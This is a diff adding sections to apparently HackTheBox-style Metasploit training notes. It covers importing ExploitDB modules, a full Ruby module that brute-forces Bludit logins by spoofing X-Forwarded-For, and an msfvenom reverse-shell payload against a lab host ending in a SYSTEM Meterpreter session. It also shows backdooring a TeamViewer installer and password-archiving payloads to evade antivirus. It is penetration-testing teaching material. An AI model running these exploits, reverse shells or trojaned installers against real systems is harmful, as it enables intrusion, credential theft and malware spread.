@@ -91,6 +91,42 @@
       - [MSF - PrivEsc](#msf---privesc)
       - [MSF - Dumping Hashes](#msf---dumping-hashes)
       - [MSF - Meterpreter LSA Secrets Dump](#msf---meterpreter-lsa-secrets-dump)
+  - [Writing and Importing Modules](#writing-and-importing-modules)
+    - [Example Nagios3](#example-nagios3)
+      - [MSF - Search for Exploits](#msf---search-for-exploits)
+      - [MSF - Directory Structure](#msf---directory-structure)
+      - [MSF - Loading Additional Modules at Runtime](#msf---loading-additional-modules-at-runtime)
+      - [MSF - Loading Additional Modules](#msf---loading-additional-modules)
+    - [Porting Over Scripts into Metasploit Modules](#porting-over-scripts-into-metasploit-modules)
+      - [Porting MSF Modules](#porting-msf-modules)
+    - [Writing your Module](#writing-your-module)
+      - [PoC - Requirements](#poc---requirements)
+      - [PoC - Module Information](#poc---module-information)
+      - [PoC - Functions](#poc---functions)
+      - [PoC](#poc)
+  - [Introduction to MSFVenom](#introduction-to-msfvenom)
+    - [Creating you Payloads](#creating-you-payloads)
+      - [Scanning the Target](#scanning-the-target)
+      - [FTP Anonymous Access](#ftp-anonymous-access)
+      - [Generating Payload](#generating-payload)
+      - [MSF - Setting Up Multi/Handler](#msf---setting-up-multihandler)
+      - [Executing the Payload](#executing-the-payload)
+      - [MSF - Meterpreter Shell](#msf---meterpreter-shell)
+    - [Local Exploit Suggester](#local-exploit-suggester)
+      - [MSF - Searching for Local Exploit Suggester](#msf---searching-for-local-exploit-suggester)
+      - [MSF - Local PrivEsc](#msf---local-privesc)
+  - [Firewall and IDS/IPS Evasion](#firewall-and-idsips-evasion)
+    - [Endpoint Protection](#endpoint-protection)
+    - [Perimeter Protection](#perimeter-protection)
+    - [Security Policies](#security-policies)
+    - [Evasion Techniques](#evasion-techniques)
+    - [Archives](#archives)
+      - [Generating Payload](#generating-payload-1)
+      - [Archiving the Payload](#archiving-the-payload)
+      - [Removing the .rar Extension](#removing-the-rar-extension)
+      - [Archiving the Payload again](#archiving-the-payload-again)
+      - [Removing the .rar Extension](#removing-the-rar-extension-1)
+    - [Packers](#packers)
 
 ---
 
@@ -2501,3 +2537,952 @@ Secret  : _SC_WebClient / service 'WebClient' with username : NT AUTHORITY\Local
 ```
 
 From this point, if the machine was connected to a more extensive network, you could use this loot to pivot through the system, gain access to internal resources and impersonate users with a higher level of access if the overall security posture of the network is weak.
+
+## Writing and Importing Modules
+
+To install any new metasploit modules which have already been ported over by other users, one can choose to update their msfconsole from the terminal, which will ensure that all newest exploits, auxiliaries, and features will be installed in the latest version of msfconsole.
+
+However, if you need only a specific module and do not want to perform a full upgrade, you can download that module and install it manually. You will focus on searching ExploitDB for readily available metasploit modules, which you can directly import into your version of msfconsole locally.
+
+### Example Nagios3
+
+Let's say you want to use an exploit for Nagios3, which will take advantage of a command injection vuln. The module you are looking for is "Nagios3 - 'statuswml.cgi' Command Injection (Metasploit)". So you fire up msfconsole and try to search for that specific exploit, but you cannot find it. This means that your metasploit framework is not up to date or that the specific Nagios3 exploit module you are looking for is not in the official update release.
+
+#### MSF - Search for Exploits
+
+```bash
+msf6 > search nagios
+
+Matching Modules
+================
+
+   #  Name                                                          Disclosure Date  Rank       Check  Description
+   -  ----                                                          ---------------  ----       -----  -----------
+   0  exploit/linux/http/nagios_xi_authenticated_rce                2019-07-29       excellent  Yes    Nagios XI Authenticated Remote Command Execution
+   1  exploit/linux/http/nagios_xi_chained_rce                      2016-03-06       excellent  Yes    Nagios XI Chained Remote Code Execution
+   2  exploit/linux/http/nagios_xi_chained_rce_2_electric_boogaloo  2018-04-17       manual     Yes    Nagios XI Chained Remote Code Execution
+   3  exploit/linux/http/nagios_xi_magpie_debug                     2018-11-14       excellent  Yes    Nagios XI Magpie_debug.php Root Remote Code Execution
+   4  exploit/linux/misc/nagios_nrpe_arguments                      2013-02-21       excellent  Yes    Nagios Remote Plugin Executor Arbitrary Command Execution
+   5  exploit/unix/webapp/nagios3_history_cgi                       2012-12-09       great      Yes    Nagios3 history.cgi Host Command Execution
+   6  exploit/unix/webapp/nagios_graph_explorer                     2012-11-30       excellent  Yes    Nagios XI Network Monitor Graph Explorer Component Command Injection
+   7  post/linux/gather/enum_nagios_xi                              2018-04-17       normal     No     Nagios XI Enumeration
+```
+
+You can, however, find the exploit code inside ExploitDB's entries. Alternatively, if you do not want to use your web browser to search for a specific exploit within ExploitDB, you can use the CLI version, searchsploit.
+
+```bash
+d41y@htb[/htb]$ searchsploit nagios3
+
+--------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                                                               |  Path
+--------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Nagios3 - 'history.cgi' Host Command Execution (Metasploit)                                                                                  | linux/remote/24159.rb
+Nagios3 - 'history.cgi' Remote Command Execution                                                                                             | multiple/remote/24084.py
+Nagios3 - 'statuswml.cgi' 'Ping' Command Execution (Metasploit)                                                                              | cgi/webapps/16908.rb
+Nagios3 - 'statuswml.cgi' Command Injection (Metasploit)                                                                                     | unix/webapps/9861.rb
+--------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+```
+
+Note that the hosted file terminations that end in .rb are Ruby scripts that most likely have been crafted specifically for use within msfconsole. You can also filter only by .rb file terminations to avoid output from scripts that cannot run within msfconsole. Note that not all .rb files are automatically converted to msfconsole modules. Some exploits are written in Ruby without having any metasploit module-compatible code in them.
+
+```bash
+d41y@htb[/htb]$ searchsploit -t Nagios3 --exclude=".py"
+
+--------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                                                               |  Path
+--------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Nagios3 - 'history.cgi' Host Command Execution (Metasploit)                                                                                  | linux/remote/24159.rb
+Nagios3 - 'statuswml.cgi' 'Ping' Command Execution (Metasploit)                                                                              | cgi/webapps/16908.rb
+Nagios3 - 'statuswml.cgi' Command Injection (Metasploit)                                                                                     | unix/webapps/9861.rb
+--------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+```
+
+You have to download the .rb file and place it in the correct directory. The default directory where all the modules, scripts, plugins, and msfconsole proprietary files are stored is ```/usr/share/metasploit-framework```. The critical folders are also symlinked in your home and root folders in the hidden ```~/.msf4/``` location.
+
+#### MSF - Directory Structure
+
+```bash
+d41y@htb[/htb]$ ls /usr/share/metasploit-framework/
+
+app     db             Gemfile.lock                  modules     msfdb            msfrpcd    msf-ws.ru  ruby             script-recon  vendor
+config  documentation  lib                           msfconsole  msf-json-rpc.ru  msfupdate  plugins    script-exploit   scripts
+data    Gemfile        metasploit-framework.gemspec  msfd        msfrpc           msfvenom   Rakefile   script-password  tools
+
+...
+
+d41y@htb[/htb]$ ls .msf4/
+
+history  local  logos  logs  loot  modules  plugins  store
+```
+
+You copy it into the appropriate directory after downloading the exploit. Note that your home folder ```.msf4``` location might not have all the folder structure that the ```/usr/share/metasploit-framework/``` one might have. So, you will just need to ```mkdir``` the appropriate folders so that the structure is the same as the original folder so that msfconsole can find the new modules. After that, you will be proceeding with copying the .rb script directly into the primary location.
+
+Please note that there are certain naming conventions that, if not adequately respected, will generate errors when trying to get msfconsole to recognize the new module you installed. Always use snake-case, alphanumeric chars, and underscores instead of dashes.
+
+For example:
+
+- nagios3_command_injection.rb
+- our_module_here.rb
+
+#### MSF - Loading Additional Modules at Runtime
+
+```bash
+d41y@htb[/htb]$ cp ~/Downloads/9861.rb /usr/share/metasploit-framework/modules/exploits/unix/webapp/nagios3_command_injection.rb
+d41y@htb[/htb]$ msfconsole -m /usr/share/metasploit-framework/modules/
+```
+
+#### MSF - Loading Additional Modules
+
+```bash
+msf6> loadpath /usr/share/metasploit-framework/modules/
+```
+
+Alternatively, you can also launch msfconsole and run the reload_all command for the newly installed module to appear in the list. After the command is run an no errors are reported, try either the ```search [name]``` function inside msfconsole or directly with the ```use [module-path]``` to jump into the newly installed module.
+
+```bash
+msf6 > reload_all
+msf6 > use exploit/unix/webapp/nagios3_command_injection 
+msf6 exploit(unix/webapp/nagios3_command_injection) > show options
+
+Module options (exploit/unix/webapp/nagios3_command_injection):
+
+   Name     Current Setting                 Required  Description
+   ----     ---------------                 --------  -----------
+   PASS     guest                           yes       The password to authenticate with
+   Proxies                                  no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS                                   yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RPORT    80                              yes       The target port (TCP)
+   SSL      false                           no        Negotiate SSL/TLS for outgoing connections
+   URI      /nagios3/cgi-bin/statuswml.cgi  yes       The full URI path to statuswml.cgi
+   USER     guest                           yes       The username to authenticate with
+   VHOST                                    no        HTTP server virtual host
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic Target
+```
+
+### Porting Over Scripts into Metasploit Modules
+
+To adapt a custom Python, PHP, or any type of exploit script to a Ruby module for metasploit, you will need to learn the Ruby programming language. Note that Ruby modules for metasploit are always written using hard tabs.
+
+You start by picking some exploit code to port over to metasploit. In this example, you will go for "Bludit 3.9.2 - Authentication Bruteforce Mitigation Bypass". You will need to download the script, 48746.rb and proceed to copy it into the ```/usr/share/metasploit-framework/modules/exploits/linux/http/``` folder. If you boot into msfconsole right now, you will only be able to find a single Bludit CMS exploit in the same folder as above, confirming that your exploit has not been ported over yet. It is good news that there is already a Bludit exploit in that folder because you will use it as boilerplate code for your new exploit.
+
+#### Porting MSF Modules
+
+```bash
+d41y@htb[/htb]$ ls /usr/share/metasploit-framework/modules/exploits/linux/http/ | grep bludit
+
+bludit_upload_images_exec.rb
+
+...
+
+d41y@htb[/htb]$ cp ~/Downloads/48746.rb /usr/share/metasploit-framework/modules/exploits/linux/http/bludit_auth_bruteforce_mitigation_bypass.rb
+```
+
+At the beginning of the file you copied, which is where you will be filling in your information, you can notice the ```include``` statements at the beginning of the boilerplate module. These are the mixins, and you will need to change these to the appropriate ones for your module.
+
+If you want to find the appropriate mixins, classes, and methods required for your module to work, you will need to look up the different entries on the rubydoc rapid7 documentation.
+
+### Writing your Module
+
+You will often face a custom-built network running proprietary code to serve its clients during specific assessments. Most of the modules you have at hand do not even make a dent in their perimeter, and you cannot seem to scan and document the target with anything you have correctly. This is where you might find it helpful to dust off your Ruby skills and start coding your modules.
+
+All necessary information about metasploit Ruby coding can be found [here](https://www.rubydoc.info/github/rapid7/metasploit-framework). From scanners to other axuiliary tools, from custom-made exploits to ported ones, coding in Ruby for the framework is an amazingly applicable skill.
+
+Look below at a similar module that you can use as boilerplate code for your exploit port-over. This is the Bludit Directory Traversal Image File Upload Vulnerability exploit, which has already been imported into msfconsole. Take a moment to acknowledge all the different fields included in the module before the exploit PoC. Note that this code has not been changed in the snippet below to fit your current import but is a direct snapshot of the pre-existing module mentioned above. The information will need to be adjusted accordingly for the new port-over project.
+
+#### PoC - Requirements
+
+```ruby
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+
+  include Msf::Exploit::Remote::HttpClient
+  include Msf::Exploit::PhpEXE
+  include Msf::Exploit::FileDropper
+  include Msf::Auxiliary::Report
+```
+
+You can look at the ```include``` statements to see what each one does. This can be done by cross-referencing them with the rubydoc rapid7 documentation. Below are their respective functions as explained in the documentation:
+
+| Function | Description |
+| -------- | ----------- |
+| ```Msf::Exploit::Remote::HttpClient``` | this module provides methods for acting as an HTTP client when exploiting an HTTP server |
+| ```Msf::Exploit::PhpEXE``` | this is a method for generating a first-stage php payload |
+| ```Msf::Exploit::FileDropper``` | this method transfers files and handles file clean-up after a session with the target is established |
+| ```Msf::Auxiliary::Report``` | this module provides methods for reporting data to the MSF DB |
+
+Looking at their purposes above, you conclude that you will not need the FileDropper method, and you can drop it from the final module code.
+
+You see that there are different sections dedicated to the ```info``` page of the module, the ```options``` section. You fill them in appropriately, offering the credit due to the individuals who discovered the exploit, the CVE information, and other relevant details.
+
+#### PoC - Module Information
+
+```ruby
+ def initialize(info={})
+    super(update_info(info,
+      'Name'           => "Bludit Directory Traversal Image File Upload Vulnerability",
+      'Description'    => %q{
+        This module exploits a vulnerability in Bludit. A remote user could abuse the uuid
+        parameter in the image upload feature in order to save a malicious payload anywhere
+        onto the server, and then use a custom .htaccess file to bypass the file extension
+        check to finally get remote code execution.
+      },
+      'License'        => MSF_LICENSE,
+      'Author'         =>
+        [
+          'christasa', # Original discovery
+          'sinn3r'     # Metasploit module
+        ],
+      'References'     =>
+        [
+          ['CVE', '2019-16113'],
+          ['URL', 'https://github.com/bludit/bludit/issues/1081'],
+          ['URL', 'https://github.com/bludit/bludit/commit/a9640ff6b5f2c0fa770ad7758daf24fec6fbf3f5#diff-6f5ea518e6fc98fb4c16830bbf9f5dac' ]
+        ],
+      'Platform'       => 'php',
+      'Arch'           => ARCH_PHP,
+      'Notes'          =>
+        {
+          'SideEffects' => [ IOC_IN_LOGS ],
+          'Reliability' => [ REPEATABLE_SESSION ],
+          'Stability'   => [ CRASH_SAFE ]
+        },
+      'Targets'        =>
+        [
+          [ 'Bludit v3.9.2', {} ]
+        ],
+      'Privileged'     => false,
+      'DisclosureDate' => "2019-09-07",
+      'DefaultTarget'  => 0))
+```
+
+After the general identification information is filled in, you can move over to the ```options``` menu available.
+
+#### PoC - Functions
+
+```ruby
+register_options(
+      [
+        OptString.new('TARGETURI', [true, 'The base path for Bludit', '/']),
+        OptString.new('BLUDITUSER', [true, 'The username for Bludit']),
+        OptString.new('BLUDITPASS', [true, 'The password for Bludit'])
+      ])
+  end
+```
+
+Looking back at your exploit, you see that a wordlist will be required instead of the ```BLUDITPASS``` variable for the module to brute-force the passwords for the same username. It would look something like the following:
+
+```ruby
+OptPath.new('PASSWORDS', [ true, 'The list of passwords',
+          File.join(Msf::Config.data_directory, "wordlists", "passwords.txt") ])
+```
+
+The rest of the exploit code needs to be adjusted according to the classes, methods, and variables used in the porting to the metasploit framework for the module to work in the end. The final version of the module would look like this:
+
+#### PoC
+
+```ruby
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+
+  include Msf::Exploit::Remote::HttpClient
+  include Msf::Exploit::PhpEXE
+  include Msf::Auxiliary::Report
+  
+  def initialize(info={})
+    super(update_info(info,
+      'Name'           => "Bludit 3.9.2 - Authentication Bruteforce Mitigation Bypass",
+      'Description'    => %q{
+        Versions prior to and including 3.9.2 of the Bludit CMS are vulnerable to a bypass of the anti-brute force mechanism that is in place to block users that have attempted to login incorrectly ten times or more. Within the bl-kernel/security.class.php file, a function named getUserIp attempts to determine the valid IP address of the end-user by trusting the X-Forwarded-For and Client-IP HTTP headers.
+      },
+      'License'        => MSF_LICENSE,
+      'Author'         =>
+        [
+          'rastating', # Original discovery
+          '0ne-nine9'  # Metasploit module
+        ],
+      'References'     =>
+        [
+          ['CVE', '2019-17240'],
+          ['URL', 'https://rastating.github.io/bludit-brute-force-mitigation-bypass/'],
+          ['PATCH', 'https://github.com/bludit/bludit/pull/1090' ]
+        ],
+      'Platform'       => 'php',
+      'Arch'           => ARCH_PHP,
+      'Notes'          =>
+        {
+          'SideEffects' => [ IOC_IN_LOGS ],
+          'Reliability' => [ REPEATABLE_SESSION ],
+          'Stability'   => [ CRASH_SAFE ]
+        },
+      'Targets'        =>
+        [
+          [ 'Bludit v3.9.2', {} ]
+        ],
+      'Privileged'     => false,
+      'DisclosureDate' => "2019-10-05",
+      'DefaultTarget'  => 0))
+      
+     register_options(
+      [
+        OptString.new('TARGETURI', [true, 'The base path for Bludit', '/']),
+        OptString.new('BLUDITUSER', [true, 'The username for Bludit']),
+        OptPath.new('PASSWORDS', [ true, 'The list of passwords',
+        	File.join(Msf::Config.data_directory, "wordlists", "passwords.txt") ])
+      ])
+  end
+  
+  # -- Exploit code -- #
+  # dirty workaround to remove this warning:
+#   Cookie#domain returns dot-less domain name now. Use Cookie#dot_domain if you need "." at the beginning.
+# see https://github.com/nahi/httpclient/issues/252
+class WebAgent
+  class Cookie < HTTP::Cookie
+    def domain
+      self.original_domain
+    end
+  end
+end
+
+def get_csrf(client, login_url)
+  res = client.get(login_url)
+  csrf_token = /input.+?name="tokenCSRF".+?value="(.+?)"/.match(res.body).captures[0]
+end
+
+def auth_ok?(res)
+  HTTP::Status.redirect?(res.code) &&
+    %r{/admin/dashboard}.match?(res.headers['Location'])
+end
+
+def bruteforce_auth(client, host, username, wordlist)
+  login_url = host + '/admin/login'
+  File.foreach(wordlist).with_index do |password, i|
+    password = password.chomp
+    csrf_token = get_csrf(client, login_url)
+    headers = {
+      'X-Forwarded-For' => "#{i}-#{password[..4]}",
+    }
+    data = {
+      'tokenCSRF' => csrf_token,
+      'username' => username,
+      'password' => password,
+    }
+    puts "[*] Trying password: #{password}"
+    auth_res = client.post(login_url, data, headers)
+    if auth_ok?(auth_res)
+      puts "\n[+] Password found: #{password}"
+      break
+    end
+  end
+end
+
+#begin
+#  args = Docopt.docopt(doc)
+#  pp args if args['--debug']
+#
+#  clnt = HTTPClient.new
+#  bruteforce_auth(clnt, args['--root-url'], args['--user'], args['--#wordlist'])
+#rescue Docopt::Exit => e
+#  puts e.message
+#end
+```
+
+## Introduction to MSFVenom
+
+MSFVenom is the successor of MSFPayload and MSFEncode, two stand-alone scripts that used to work in conjunction with msfconsole to provide users with highly customizable and hard-to-detect payloads for their exploits.
+
+### Creating you Payloads
+
+Suppose you have found an open FTP port that either had weak creds or was open to Anonymous login by accident. Now, suppose that the FTP server itself is linked to a webs service running on port tcp/80 of the same machine and that all of the files found in the FTP root dir can be viewed in the web-service's ```/uploads``` dir. Also suppose that the web service does not have any checks for what you are allowed to run on it as a client.
+
+Suppose you are hypothetically allowed to call anything from the web service. In that case, you can upload a PHP shell directly through the FTP server and access it from the web, triggering the payload and allowing you to receive a reverse TCP connection from the victim machine.
+
+#### Scanning the Target
+
+```bash
+d41y@htb[/htb]$ nmap -sV -T4 -p- 10.10.10.5
+
+<SNIP>
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     Microsoft ftpd
+80/tcp open  http    Microsoft IIS httpd 7.5
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+```
+
+#### FTP Anonymous Access
+
+```bash
+d41y@htb[/htb]$ ftp 10.10.10.5
+
+Connected to 10.10.10.5.
+220 Microsoft FTP Service
+
+
+Name (10.10.10.5:root): anonymous
+
+331 Anonymous access allowed, send identity (e-mail name) as password.
+
+
+Password: ******
+
+230 User logged in.
+Remote system type is Windows_NT.
+
+
+ftp> ls
+
+200 PORT command successful.
+125 Data connection already open; Transfer starting.
+03-18-17  02:06AM       <DIR>          aspnet_client
+03-17-17  05:37PM                  689 iisstart.htm
+03-17-17  05:37PM               184946 welcome.png
+226 Transfer complete.
+```
+
+Noticing the aspnet_client, you realize that the box will be able to run .apsx reverse shells. Luckily for you, msfvenom can do just that without any issues.
+
+#### Generating Payload
+
+```bash
+d41y@htb[/htb]$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=1337 -f aspx > reverse_shell.aspx
+
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+No encoder or badchars specified, outputting raw payload
+Payload size: 341 bytes
+Final size of aspx file: 2819 bytes
+
+...
+
+d41y@htb[/htb]$ ls
+
+Desktop  Documents  Downloads  my_data  Postman  PycharmProjects  reverse_shell.aspx  Templates
+```
+
+Now, you only need to naviagte to ```http://10.10.10.5/reverse_shell.aspx``` and it will trigger the .apsx payload. Before you do that, however, you should start a listener on msfconsole so that the reverse connection request gets caught inside it.
+
+#### MSF - Setting Up Multi/Handler
+
+```bash
+d41y@htb[/htb]$ msfconsole -q 
+
+msf6 > use multi/handler
+msf6 exploit(multi/handler) > show options
+
+Module options (exploit/multi/handler):
+
+   Name  Current Setting  Required  Description
+   ----  ---------------  --------  -----------
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Wildcard Target
+
+
+msf6 exploit(multi/handler) > set LHOST 10.10.14.5
+
+LHOST => 10.10.14.5
+
+
+msf6 exploit(multi/handler) > set LPORT 1337
+
+LPORT => 1337
+
+
+msf6 exploit(multi/handler) > run
+
+[*] Started reverse TCP handler on 10.10.14.5:1337 
+```
+
+#### Executing the Payload
+
+Now you can trigger the .aspx payload on the web service. Doing so will load absolutely nothing visually speaking on the page, but looking back at your multi/handler, you would have received a connection. You should ensure that your .apsx file does not contain HTML, so you will only see a blank web page. However, the payload is executed in the background anyway.
+
+#### MSF - Meterpreter Shell
+
+```bash
+<...SNIP...>
+[*] Started reverse TCP handler on 10.10.14.5:1337 
+
+[*] Sending stage (176195 bytes) to 10.10.10.5
+[*] Meterpreter session 1 opened (10.10.14.5:1337 -> 10.10.10.5:49157) at 2020-08-28 16:33:14 +0000
+
+
+meterpreter > getuid
+
+Server username: IIS APPPOOL\Web
+
+
+meterpreter > 
+
+[*] 10.10.10.5 - Meterpreter session 1 closed.  Reason: Died
+```
+
+### Local Exploit Suggester
+
+There is a module called the "Local Exploit Suggester". You will be using this module for this example, as the meterpreter shell landed on the IIS APPOOL\Web user, which naturally does not have many permissions. Furthermore, running the ```sysinfo``` command shows you that the system is of x86 bit architecture, giving you even more reason to trust the Local Exploit Suggester.
+
+
+#### MSF - Searching for Local Exploit Suggester
+
+```bash
+msf6 > search local exploit suggester
+
+<...SNIP...>
+   2375  post/multi/manage/screenshare                                                              normal     No     Multi Manage the screen of the target meterpreter session
+   2376  post/multi/recon/local_exploit_suggester                                                   normal     No     Multi Recon Local Exploit Suggester
+   2377  post/osx/gather/apfs_encrypted_volume_passwd                              2018-03-21       normal     Yes    Mac OS X APFS Encrypted Volume Password Disclosure
+
+<SNIP>
+
+msf6 exploit(multi/handler) > use 2376
+msf6 post(multi/recon/local_exploit_suggester) > show options
+
+Module options (post/multi/recon/local_exploit_suggester):
+
+   Name             Current Setting  Required  Description
+   ----             ---------------  --------  -----------
+   SESSION                           yes       The session to run this module on
+   SHOWDESCRIPTION  false            yes       Displays a detailed description for the available exploits
+
+
+msf6 post(multi/recon/local_exploit_suggester) > set session 2
+
+session => 2
+
+
+msf6 post(multi/recon/local_exploit_suggester) > run
+
+[*] 10.10.10.5 - Collecting local exploits for x86/windows...
+[*] 10.10.10.5 - 31 exploit checks are being tried...
+[+] 10.10.10.5 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
+[+] 10.10.10.5 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.
+[+] 10.10.10.5 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable.
+[+] 10.10.10.5 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable.
+[+] 10.10.10.5 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable.
+[+] 10.10.10.5 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
+[+] 10.10.10.5 - exploit/windows/local/ms15_004_tswbproxy: The service is running, but could not be validated.
+[+] 10.10.10.5 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
+[+] 10.10.10.5 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated.
+[+] 10.10.10.5 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
+[+] 10.10.10.5 - exploit/windows/local/ntusermndragover: The target appears to be vulnerable.
+[+] 10.10.10.5 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
+[*] Post module execution completed
+```
+
+Having these results in front of you, you can easily pick one of them to test out. If the one you chose is not valid after all, move on to the next. Not all checks are 100% accurate, and not all variables are the same. Going down the list, ```bypassauc_eventvwr``` fails due to the IIS user not being a part of the administrator's group, which is the default and expected. The second option, ```ms10_015_kitrap0d```, does the trick.
+
+#### MSF - Local PrivEsc
+
+```bash
+msf6 exploit(multi/handler) > search kitrap0d
+
+Matching Modules
+================
+
+   #  Name                                     Disclosure Date  Rank   Check  Description
+   -  ----                                     ---------------  ----   -----  -----------
+   0  exploit/windows/local/ms10_015_kitrap0d  2010-01-19       great  Yes    Windows SYSTEM Escalation via KiTrap0D
+
+
+msf6 exploit(multi/handler) > use 0
+msf6 exploit(windows/local/ms10_015_kitrap0d) > show options
+
+Module options (exploit/windows/local/ms10_015_kitrap0d):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   SESSION  2                yes       The session to run this module on.
+
+
+Payload options (windows/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST     tun0             yes       The listen address (an interface may be specified)
+   LPORT     1338             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Windows 2K SP4 - Windows 7 (x86)
+
+
+msf6 exploit(windows/local/ms10_015_kitrap0d) > set LPORT 1338
+
+LPORT => 1338
+
+
+msf6 exploit(windows/local/ms10_015_kitrap0d) > set SESSION 3
+
+SESSION => 3
+
+
+msf6 exploit(windows/local/ms10_015_kitrap0d) > run
+
+[*] Started reverse TCP handler on 10.10.14.5:1338 
+[*] Launching notepad to host the exploit...
+[+] Process 3552 launched.
+[*] Reflectively injecting the exploit DLL into 3552...
+[*] Injecting exploit into 3552 ...
+[*] Exploit injected. Injecting payload into 3552...
+[*] Payload injected. Executing exploit...
+[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
+[*] Sending stage (176195 bytes) to 10.10.10.5
+[*] Meterpreter session 4 opened (10.10.14.5:1338 -> 10.10.10.5:49162) at 2020-08-28 17:15:56 +0000
+
+
+meterpreter > getuid
+
+Server username: NT AUTHORITY\SYSTEM
+```
+
+## Firewall and IDS/IPS Evasion
+
+### Endpoint Protection
+
+... refers to any localized device or service whose sole purpose is to protect a single host on the network. The host can be a personal computer, a corporate workstation, or a server in a network's De-Militarized Zone.
+
+Endpoint protection usually comes in the form of software packs which include Antivirus Protection, Antimalware Protection, Firewall, and Anti-DDoS all in one, under the same software package. You are better familiarized with this form than the latter, as most of you are running endpoint protection software on your PCs at home or the workstations at your workplace.
+
+### Perimeter Protection
+
+... usually comes in physical or virtualized devices on the network perimeter edge. These edge devices themselves provide access inside of the network from the outside, in other terms, from public to private.
+
+Between these two zones, on some occasions, you will also find a third one, called the DMZ. This is a lower-security policy level zone than the inside networks', but with a higher trust level than the outside zone, which is the vast internet. This is the virtual space where public-facing servers are housed, which push and pull data for public clients from the internet but are also managed from the inside and updated with patches, information, and other data to keep the served information up to date and satisfy the customers of the servers.
+
+### Security Policies
+
+... are the drive behind every well-maintained security posture of any network. They function the same way as ACL do. They are essentially a list of ```allow``` and ```deny``` statements that dictate how traffic or files can exist within a network boundary. Multiple lists can act upon multiple network parts, allowing for flexibility within a configuration. These lists can also target different features of the network and hosts, depending on where they reside.
+
+### Evasion Techniques
+
+Msfvenom offers the option of using executable templates. This allows you to use some pre-set templates for executable files, inject your payload into them, and use any executable as a platform from which you can launch your attack. You can embed the shellcode into any installer, package, or programm that you have at hand, hiding the payload shellcode deep within the legitimate code of the actual product. This greatyl obfuscates your malicious code and, more importantly, lowers your detection chances. There are many valid combinations between actual, legitimate executable files, your different encoding schemes, and your different payload shellcode variants. This generates what is called a backdoored executable.
+
+```bash
+d41y@htb[/htb]$ msfvenom windows/x86/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=8080 -k -x ~/Downloads/TeamViewer_Setup.exe -e x86/shikata_ga_nai -a x86 --platform windows -o ~/Desktop/TeamViewer_Setup.exe -i 5
+
+Attempting to read payload from STDIN...
+Found 1 compatible encoders
+Attempting to encode payload with 5 iterations of x86/shikata_ga_nai
+x86/shikata_ga_nai succeeded with size 27 (iteration=0)
+x86/shikata_ga_nai succeeded with size 54 (iteration=1)
+x86/shikata_ga_nai succeeded with size 81 (iteration=2)
+x86/shikata_ga_nai succeeded with size 108 (iteration=3)
+x86/shikata_ga_nai succeeded with size 135 (iteration=4)
+x86/shikata_ga_nai chosen with final size 135
+Payload size: 135 bytes
+Saved as: /home/user/Desktop/TeamViewer_Setup.exe
+```
+
+... and:
+
+```bash
+d41y@htb[/htb]$ ls
+
+Pictures-of-cats.tar.gz  TeamViewer_Setup.exe  Cake_recipes
+```
+
+For the most part, when a target launches a backdoored executable, nothing will appear to happen, which can raise suspicions in some cases. To improve your chances, you need to trigger the continuation of the normal execution of the launched app while pulling the payload in a separate thread from the main app. You do so with the ```-k``` flag as it appears above. However, even with the ```-k``` flag running, the target will only notice the running backdoor if they launch the backdoored executable template from a CLI environment. If they do so, a separate window will pop up with the payload, which will not close until you finish running the payload session interaction on the target.
+
+### Archives
+
+Archiving a piece of information such as a file, folder, script, executable, picture, or document and placing a password on the archive bypasses a lot of common AV signatures today. However, the downside of this process is that they will be raised as notifications in the AV alarm dashboard as beind unable to be scanned due to being locked with a password. An admin can choose to manually inspect these archives to determine if they are malicious or not.
+
+#### Generating Payload
+
+```bash
+d41y@htb[/htb]$ msfvenom windows/x86/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=8080 -k -e x86/shikata_ga_nai -a x86 --platform windows -o ~/test.js -i 5
+
+Attempting to read payload from STDIN...
+Found 1 compatible encoders
+Attempting to encode payload with 5 iterations of x86/shikata_ga_nai
+x86/shikata_ga_nai succeeded with size 27 (iteration=0)
+x86/shikata_ga_nai succeeded with size 54 (iteration=1)
+x86/shikata_ga_nai succeeded with size 81 (iteration=2)
+x86/shikata_ga_nai succeeded with size 108 (iteration=3)
+x86/shikata_ga_nai succeeded with size 135 (iteration=4)
